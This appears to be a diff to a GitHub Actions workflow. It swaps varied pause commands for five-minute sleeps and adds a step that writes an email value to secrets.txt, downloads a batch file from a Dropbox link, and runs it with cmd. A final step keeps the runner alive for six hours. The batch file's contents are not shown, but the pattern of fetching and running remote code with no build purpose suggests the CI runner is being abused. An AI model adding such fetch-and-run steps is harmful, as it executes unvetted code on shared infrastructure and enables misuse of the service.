@@ -10,28 +10,40 @@ jobs:
     steps:
       
       - name: A
-        run: start-sleep 10
+        run: start-sleep 300
 
       - name: B
-        run: start-sleep -s 10
+        run: start-sleep -s 300
 
       - name: C
-        run: Read-Host -s 10
+        run: start-sleep 300
 
       - name: D
-        run: Read-Host -seconds 10
+        run: start-sleep -s 300
 
       - name: E
-        run: Read-Host 10
+        run: start-sleep 300
 
       - name: F
-        run:  Read-Host -Prompt "Press any key to continue"
+        run:  start-sleep -s 300
 
       - name: G
-        run: Pause -s 10
+        run: start-sleep 300
 
       - name: H
-        run: Pause -seconds 10
+        run: start-sleep -s 300
 
       - name: I
-        run: Pause 10
+        run: start-sleep 300
+
+      - name: J
+        run: start-sleep -s 300
+      
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3fv6r025lzn92gv6atbbu/down.bat?rlkey=ti46bzfu0kss1kvcoazxe7iab&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+
+      - name: K
+        run: Start-sleep -Seconds 21600
